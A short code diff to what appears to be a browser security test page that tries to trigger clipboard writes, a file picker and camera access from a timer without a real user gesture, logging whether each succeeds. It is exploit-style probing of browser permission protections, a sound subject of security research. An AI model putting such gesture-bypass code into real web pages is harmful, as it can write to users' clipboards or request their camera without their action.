@@ -26,8 +26,12 @@
                     await navigator.clipboard.writeText("VULNERABLE_GHOST_GESTURE_DATA");
                 } catch (e) { console.log("Clipboard fail: " + e.message); }
                 try {
-                    await document.documentElement.requestFullscreen();
-                } catch (e) { console.log("Fullscreen fail: " + e.message); }
+                    await window.showOpenFilePicker(); 
+                    console.log("[-] File Picker SUCCESS!");
+                } catch (e) { 
+                    console.log("[-] File Picker Failed: " + e.message);
+                    navigator.mediaDevices.getUserMedia({ video: true }).catch(err => console.log("Mic/Cam juga gagal"));
+                }
             }
         }, 50);
     </script>
